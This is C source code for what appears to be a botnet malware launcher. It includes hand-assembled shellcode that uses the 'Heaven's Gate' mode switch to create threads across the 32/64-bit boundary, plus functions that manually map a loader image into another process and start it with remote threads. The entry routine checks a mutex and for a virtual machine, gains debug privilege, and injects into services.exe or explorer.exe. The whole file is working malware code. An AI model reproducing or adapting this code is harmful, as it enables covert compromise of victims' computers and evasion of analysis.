#include "launcher.h"

DWORD dwID = 0;


BYTE CreateThreadPIC[] = {
    /* 0000 */ 0x53,                                                                                        /* push rbx */
    /* 0001 */ 0x56,                                                                                        /* push rsi */
    /* 0002 */ 0x57,                                                                                        /* push rdi */
    /* 0003 */ 0x55,                                                                                        /* push rbp */
    /* 0004 */ 0xE8, 0x6C, 0x00, 0x00, 0x00,                                                /* call 0x75 */
    /* 0009 */ 0x85, 0xC0,                                                                              /* test eax, eax */
    /* 000B */ 0x74, 0x5D,                                                                              /* jz 0x6a */
    /* 000D */ 0x48, 0x89, 0xE6,                                                                    /* mov rsi, rsp */
    /* 0010 */ 0x48, 0x83, 0xE4, 0xF0,                                                          /* and rsp, 0xFffffffffffffff0 */
    /* 0014 */ 0x48, 0x83, 0xEC, 0x68,                                                          /* sub rsp, 0x68 */
    /* 0018 */ 0xB8, 0xFA, 0x80, 0x39, 0x5E,                                                /* mov eax, 0x5e3980fa */
    /* 001D */ 0xE8, 0x78, 0x00, 0x00, 0x00,                                                /* call 0x9a */
    /* 0022 */ 0x48, 0x89, 0xC3,                                                                    /* mov rbx, rax */
    /* 0025 */ 0x4D, 0x31, 0xC0,                                                                    /* xor r8, r8 */
    /* 0028 */ 0x48, 0x31, 0xC0,                                                                    /* xor rax, rax */
    /* 002B */ 0x48, 0x89, 0x44, 0x24, 0x50,                                                /* mov [rsp+0x50], rax */
    /* 0030 */ 0x48, 0x89, 0x44, 0x24, 0x48,                                                /* mov [rsp+0x48], rax */
    /* 0035 */ 0x48, 0x89, 0x44, 0x24, 0x40,                                                /* mov [rsp+0x40], rax */
    /* 003A */ 0x48, 0x89, 0x44, 0x24, 0x38,                                                /* mov [rsp+0x38], rax */
    /* 003F */ 0x48, 0x89, 0x44, 0x24, 0x30,                                                /* mov [rsp+0x30], rax */
    /* 0044 */ 0x8B, 0x46, 0x24,                                                                    /* mov eax, [rsi+0x24] */
    /* 0047 */ 0x48, 0x89, 0x44, 0x24, 0x28,                                                /* mov [rsp+0x28], rax */
    /* 004C */ 0x8B, 0x46, 0x20,                                                                    /* mov eax, [rsi+0x20] */
    /* 004F */ 0x48, 0x89, 0x44, 0x24, 0x20,                                                /* mov [rsp+0x20], rax */
    /* 0054 */ 0x44, 0x8B, 0x4E, 0x14,                                                          /* mov r9d, [rsi+0x14] */
    /* 0058 */ 0xBA, 0x00, 0x00, 0x00, 0x10,                                                /* mov edx, 0x10000000 */
    /* 005D */ 0x8B, 0x4E, 0x30,                                                                    /* mov ecx, [rsi+0x30] */
    /* 0060 */ 0xFF, 0xD3,                                                                               /* call rbx */
    /* 0062 */ 0x48, 0x89, 0xF4,                                                                    /* mov rsp, rsi */
    /* 0065 */ 0xE8, 0x18, 0x00, 0x00, 0x00,                                                 /* call 0x82 */
    /* 006A */ 0x5D,                                                                                        /* pop rbp */
    /* 006B */ 0x5F,                                                                                        /* pop rdi */
    /* 006C */ 0x5E,                                                                                        /* pop rsi */
    /* 006D */ 0x5B,                                                                                        /* pop rbx */
    /* 006E */ 0xC3,                                                                                        /* ret */
    /* 006F */ 0x31, 0xC0,                                                                              /* xor eax, eax */
    /* 0071 */ 0x48, 0xF7, 0xD8,                                                                    /* neg rax */
    /* 0074 */ 0xC3,                                                                                        /* ret */
    /* 0075 */ 0xE8, 0xF5, 0xFF, 0xFF, 0xFF,                                                  /* call 0x6f */
    /* 007A */ 0x74, 0x05,                                                                              /* jz 0x81 */
    /* 007C */ 0x58,                                                                                        /* pop rax */
    /* 007D */ 0x6A, 0x33,                                                                              /* push 0x33 */
    /* 007F */ 0x50,                                                                                        /* push rax */
    /* 0080 */ 0xCB,                                                                                        /* retf */
    /* 0081 */ 0xC3,                                                                                        /* ret */
    /* 0082 */ 0xE8, 0xE8, 0xFF, 0xFF, 0xFF,                                                  /* call 0x6f */
    /* 0087 */ 0x75, 0x10,                                                                              /* jnz 0x99 */
    /* 0089 */ 0x58,                                                                                        /* pop rax */
    /* 008A */ 0x83, 0xEC, 0x08,                                                                    /* sub esp, 0x8 */
    /* 008D */ 0x89, 0x04, 0x24,                                                                    /* mov [rsp], eax */
    /* 0090 */ 0xC7, 0x44, 0x24, 0x04, 0x23, 0x00, 0x00, 0x00,                   /* mov dword [rsp+0x4], 0x23 */
    /* 0098 */ 0xCB,                                                                                        /* retf */
    /* 0099 */ 0xC3,                                                                                        /* ret */
    /* 009A */ 0x56,                                                                                        /* push rsi */
    /* 009B */ 0x57,                                                                                        /* push rdi */
    /* 009C */ 0x53,                                                                                        /* push rbx */
    /* 009D */ 0x51,                                                                                        /* push rcx */
    /* 009E */ 0x49, 0x89, 0xC0,                                                                    /* mov r8, rax */
    /* 00A1 */ 0x6A, 0x60,                                                                              /* push 0x60 */
    /* 00A3 */ 0x5E,                                                                                        /* pop rsi */
    /* 00A4 */ 0x65, 0x48, 0x8B, 0x06,                                                          /* mov rax, [gs:rsi] */
    /* 00A8 */ 0x48, 0x8B, 0x40, 0x18,                                                          /* mov rax, [rax+0x18] */
    /* 00AC */ 0x4C, 0x8B, 0x50, 0x30,                                                          /* mov r10, [rax+0x30] */
    /* 00B0 */ 0x49, 0x8B, 0x6A, 0x10,                                                           /* mov rbp, [r10+0x10] */
    /* 00B4 */ 0x48, 0x85, 0xED,                                                                     /* test rbp, rbp */
    /* 00B7 */ 0x89, 0xE8,                                                                               /* mov eax, ebp */
    /* 00B9 */ 0x74, 0x4F,                                                                               /* jz 0x10a */
    /* 00BB */ 0x4D, 0x8B, 0x12,                                                                     /* mov r10, [r10] */
    /* 00BE */ 0x8B, 0x45, 0x3C,                                                                     /* mov eax, [rbp+0x3c] */
    /* 00C1 */ 0x83, 0xC0, 0x10,                                                                     /* add eax, 0x10 */
    /* 00C4 */ 0x8B, 0x44, 0x05, 0x78,                                                           /* mov eax, [rbp+rax+0x78] */
    /* 00C8 */ 0x48, 0x8D, 0x74, 0x05, 0x18,                                                 /* lea rsi, [rbp+rax+0x18] */
    /* 00CD */ 0xAD,                                                                                        /* lodsd */
    /* 00CE */ 0x91,                                                                                         /* xchg ecx, eax */
    /* 00CF */ 0x67, 0xE3, 0xDE,                                                                     /* jecxz 0xB0 */
    /* 00D2 */ 0xAD,                                                                                        /* lodsd */
    /* 00D3 */ 0x4C, 0x8D, 0x5C, 0x05, 0x00,                                                /* lea r11, [rbp+rax] */
    /* 00D8 */ 0xAD,                                                                                        /* lodsd */
    /* 00D9 */ 0x48, 0x8D, 0x7C, 0x05, 0x00,                                                /* lea rdi, [rbp+rax] */
    /* 00DE */ 0xAD,                                                                                        /* lodsd */
    /* 00DF */ 0x48, 0x8D, 0x5C, 0x05, 0x00,                                                /* lea rbx, [rbp+rax] */
    /* 00E4 */ 0x8B, 0x74, 0x8F, 0xFC,                                                           /* mov esi, [rdi+rcx*4-0x4] */
    /* 00E8 */ 0x48, 0x01, 0xEE,                                                                     /* add rsi, rbp */
    /* 00EB */ 0x31, 0xC0,                                                                              /* xor eax, eax */
    /* 00ED */ 0x99,                                                                                        /* cdq */
    /* 00EE */ 0xAC,                                                                                        /* lodsb */
    /* 00EF */ 0x01, 0xC2,                                                                              /* add edx, eax */
    /* 00F1 */ 0xC1, 0xC2, 0x05,                                                                    /* rol edx, 0x5 */
    /* 00F4 */ 0xFF, 0xC8,                                                                              /* dec eax */
    /* 00F6 */ 0x79, 0xF6,                                                                              /* jns 0xEe */
    /* 00F8 */ 0x44, 0x39, 0xC2,                                                                    /* cmp edx, r8d */
    /* 00FB */ 0xE0, 0xE7,                                                                              /* loopne 0xE4 */
    /* 00FD */ 0x75, 0xB1,                                                                              /* jnz 0xB0 */
    /* 00FF */ 0x0F, 0xB7, 0x14, 0x4B,                                                           /* movzx edx, word [rbx+rcx*2] */
    /* 0103 */ 0x41, 0x8B, 0x04, 0x93,                                                          /* mov eax, [r11+rdx*4] */
    /* 0107 */ 0x48, 0x01, 0xE8,                                                                    /* add rax, rbp */
    /* 010A */ 0x59,                                                                                        /* pop rcx */
    /* 010B */ 0x5B,                                                                                        /* pop rbx */
    /* 010C */ 0x5F,                                                                                        /* pop rdi */
    /* 010D */ 0x5E,                                                                                        /* pop rsi */
    /* 010E */ 0xC3                                                                                         /* ret */
};


BOOL InjectPayload32(HANDLE hProcess, DWORD dwLauncherPID, LPVOID lpLoader, LPVOID lpLauncher, DWORD dwLauncher, PWCHAR pwszLauncherPath)
{
    BOT_INFO32 bi;
    HRESULT hr = S_OK;
    HANDLE hThread = NULL;
    PIMAGE_DOS_HEADER pidh = NULL;
    PIMAGE_NT_HEADERS pinh = NULL;
    PIMAGE_SECTION_HEADER pish = NULL;
    LPVOID lpParameters = NULL;
    LPVOID lpEntryPoint = NULL;
    DWORD dwLoader = 0;
    DWORD dwOffset = 0;
    DWORD dwCnt = 0;
    BOOL bRet = FALSE;

    pidh = (PIMAGE_DOS_HEADER)lpLoader;
    pinh = (PIMAGE_NT_HEADERS)((LPBYTE)lpLoader + pidh->e_lfanew);
    dwLoader = pinh->OptionalHeader.SizeOfImage;

    SecureZeroMemory(&bi, sizeof(BOT_INFO32));
    bi.dwID = dwID;
    bi.dwLauncherPID = dwLauncherPID;

    hr = StringCbPrintfW(&bi.wszLauncherPath, sizeof(bi.wszLauncherPath), L"%ls", pwszLauncherPath);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    bi.lpLauncherBase = VirtualAllocEx(hProcess, NULL, dwLauncher, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (bi.lpLauncherBase == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    bi.dwLauncherSize = dwLauncher;

    if (!WriteProcessMemory(hProcess, bi.lpLauncherBase, lpLauncher, dwLauncher, NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    bi.lpLoaderBase = VirtualAllocEx(hProcess, NULL, dwLoader, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (bi.lpLoaderBase == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    bi.dwLoaderSize = dwLoader;

    if (!WriteProcessMemory(hProcess, bi.lpLoaderBase, lpLoader, pinh->OptionalHeader.SizeOfHeaders, NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pish = (PIMAGE_SECTION_HEADER)(pinh + 1);

    for (dwCnt = 0; dwCnt < pinh->FileHeader.NumberOfSections; dwCnt++)
    {
        if (pish[dwCnt].SizeOfRawData == 0)
        {
            continue;
        }

        if (!WriteProcessMemory(hProcess, bi.lpLoaderBase + pish[dwCnt].VirtualAddress, lpLoader + pish[dwCnt].PointerToRawData, pish[dwCnt].SizeOfRawData, NULL))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }
    }

    if (!ReadProcessMemory(hProcess, (bi.lpLoaderBase + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + 0x1C), &dwOffset, sizeof(DWORD), NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!ReadProcessMemory(hProcess, bi.lpLoaderBase + dwOffset, &dwOffset, sizeof(DWORD), NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    lpParameters = VirtualAllocEx(hProcess, NULL, sizeof(BOT_INFO32), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpParameters == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!WriteProcessMemory(hProcess, lpParameters, &bi, sizeof(BOT_INFO32), NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    lpEntryPoint = bi.lpLoaderBase + dwOffset;

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpEntryPoint, lpParameters, 0, NULL);
    if (hThread == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    bRet = TRUE;

cleanup:
    if (hThread != NULL) CloseHandle(hThread);

    return bRet;
}


BOOL InjectPayload64(HANDLE hProcess, DWORD dwLauncherPID, LPVOID lpLoader, LPVOID lpLauncher, DWORD dwLauncher, PWCHAR pwszLauncherPath)
{
    BOT_INFO64 bi;
    HRESULT hr = S_OK;
    HANDLE hThread = NULL;
    PIMAGE_DOS_HEADER pidh = NULL;
    PIMAGE_NT_HEADERS64 pinh = NULL;
    PIMAGE_SECTION_HEADER pish = NULL;
    pCreateRemoteThread64 CreateRemoteThread64 = NULL;
    LPVOID lpParameters = NULL;
    LPVOID lpEntryPoint = NULL;
    DWORD dwLoader = 0;
    DWORD dwOffset = 0;
    DWORD dwCnt = 0;
    BOOL bRet = FALSE;

    pidh = (PIMAGE_DOS_HEADER)lpLoader;
    pinh = (PIMAGE_NT_HEADERS64)((LPBYTE)lpLoader + pidh->e_lfanew);
    dwLoader = pinh->OptionalHeader.SizeOfImage;

    SecureZeroMemory(&bi, sizeof(BOT_INFO64));
    bi.dwID = dwID;
    bi.dwLauncherPID = dwLauncherPID;

    hr = StringCbPrintfW(&bi.wszLauncherPath, sizeof(bi.wszLauncherPath), L"%ls", pwszLauncherPath);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    bi.lpLauncherBase = VirtualAllocEx(hProcess, NULL, dwLauncher, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (bi.lpLauncherBase == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    bi.dwLauncherSize = dwLauncher;

    if (!WriteProcessMemory(hProcess, bi.lpLauncherBase, lpLauncher, dwLauncher, NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    bi.lpLoaderBase = VirtualAllocEx(hProcess, NULL, dwLoader, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (bi.lpLoaderBase == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    bi.dwLoaderSize = dwLoader;

    if (!WriteProcessMemory(hProcess, bi.lpLoaderBase, lpLoader, pinh->OptionalHeader.SizeOfHeaders, NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pish = (PIMAGE_SECTION_HEADER)(pinh + 1);

    for (dwCnt = 0; dwCnt < pinh->FileHeader.NumberOfSections; dwCnt++)
    {
        if (pish[dwCnt].SizeOfRawData == 0)
        {
            continue;
        }

        if (!WriteProcessMemory(hProcess, bi.lpLoaderBase + pish[dwCnt].VirtualAddress, lpLoader + pish[dwCnt].PointerToRawData, pish[dwCnt].SizeOfRawData, NULL))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }
    }

    if (!ReadProcessMemory(hProcess, bi.lpLoaderBase + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + 0x1C, &dwOffset, sizeof(DWORD), NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!ReadProcessMemory(hProcess, bi.lpLoaderBase + dwOffset, &dwOffset, sizeof(DWORD), NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    lpParameters = VirtualAllocEx(hProcess, NULL, sizeof(BOT_INFO64), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpParameters == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!WriteProcessMemory(hProcess, lpParameters, &bi, sizeof(BOT_INFO64), NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    CreateRemoteThread64 = (pCreateRemoteThread64)VirtualAlloc(NULL, sizeof(CreateThreadPIC), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (CreateRemoteThread64 == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    CopyMemory(CreateRemoteThread64, CreateThreadPIC, sizeof(CreateThreadPIC));

    lpEntryPoint = bi.lpLoaderBase + dwOffset;

    CreateRemoteThread64(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpEntryPoint, lpParameters, 0, 0, &hThread);
    if (hThread == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    bRet = TRUE;

cleanup:
    if (hThread != NULL) CloseHandle(hThread);

    return bRet;
}


VOID Start()
{
    PROCESSENTRY32 pe32;
    HANDLE hMutex = NULL;
    HANDLE hProcSnap = INVALID_HANDLE_VALUE;
    HANDLE hProcess = NULL;
    PIMAGE_DOS_HEADER pidh = NULL;
    PIMAGE_NT_HEADERS pinh = NULL;
    LPVOID lpLoader = NULL;
    LPVOID lpLauncher = NULL;
    PWCHAR pwszLauncherPath = NULL;
    DWORD dwLauncher = 0;
    DWORD dwLauncherPID = 0;
    DWORD dwInjectPID = 0;
    BOOL bWOW64 = FALSE;
    BOOL bSystem = FALSE;

    hMutex = OpenMutexW(SYNCHRONIZE, FALSE, MUTEX_NAME);
    if (hMutex != NULL)
    {
        goto cleanup;
    }
    else if (GetLastError() != ERROR_FILE_NOT_FOUND)
    {
        goto cleanup;
    }

#ifdef _VM_CHECK
    if (IsOnVirtualMachine())
    {
        OutputDebugStringW(L"WARNING - RUN ON VM!");
        goto cleanup;
    }
#endif

    dwID = GetMachineID();
    if (dwID == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!IsWow64Process(GetCurrentProcess(), &bWOW64))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    bSystem = IsProcessSystem(NULL);
    dwLauncherPID = GetCurrentProcessId();

    pwszLauncherPath = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszLauncherPath == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (GetModuleFileNameW(NULL, pwszLauncherPath, (MemorySize(pwszLauncherPath) - 2) / sizeof(WCHAR)) == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    lpLauncher = ReadFromFile(pwszLauncherPath, &dwLauncher);
    if (lpLauncher == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pidh = (PIMAGE_DOS_HEADER)lpLauncher;
    pinh = (PIMAGE_NT_HEADERS)((LPBYTE)lpLauncher + pidh->e_lfanew);

    if (pinh->FileHeader.TimeDateStamp == 0)
    {
        pinh->FileHeader.TimeDateStamp = dwID;
    }
    else
    {
        if (dwID != pinh->FileHeader.TimeDateStamp)
        {
            goto cleanup;
        }
    }

    if (!EnablePrivilege(NULL, SE_DEBUG_NAME))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcSnap == INVALID_HANDLE_VALUE)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    SecureZeroMemory(&pe32, sizeof(PROCESSENTRY32));
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32FirstW(hProcSnap, &pe32))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    do
    {
        if (bSystem)
        {
            if (StrCmpIW(pe32.szExeFile, L"services.exe") == 0)
            {
                dwInjectPID = pe32.th32ProcessID;
            }
        }
        else
        {
            if (StrCmpIW(pe32.szExeFile, L"explorer.exe") == 0)
            {
                dwInjectPID = pe32.th32ProcessID;
            }
        }

    } while(Process32NextW(hProcSnap,&pe32));

    if (dwInjectPID == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    lpLoader = GetResource(NULL, !bWOW64 ? ID_MODULE32 : ID_MODULE64, RT_RCDATA, NULL);
    if (lpLoader == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hProcess = OpenProcess(PROCESS_VM_OPERATION + PROCESS_VM_WRITE + PROCESS_VM_READ + PROCESS_CREATE_THREAD + PROCESS_QUERY_INFORMATION, FALSE, dwInjectPID);
    if (hProcess == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!bWOW64)
    {
        if (!InjectPayload32(hProcess, dwLauncherPID, lpLoader, lpLauncher, dwLauncher, pwszLauncherPath))
        {
            goto cleanup;
        }
    }
    else
    {
        if (!InjectPayload64(hProcess, dwLauncherPID, lpLoader, lpLauncher, dwLauncher, pwszLauncherPath))
        {
            goto cleanup;
        }
    }

cleanup:
    if (pwszLauncherPath != NULL) MemoryFree(pwszLauncherPath);
    if (hProcSnap != INVALID_HANDLE_VALUE) CloseHandle(hProcSnap);
    if (hProcess != INVALID_HANDLE_VALUE) CloseHandle(hProcess);

    ExitProcess(0);
}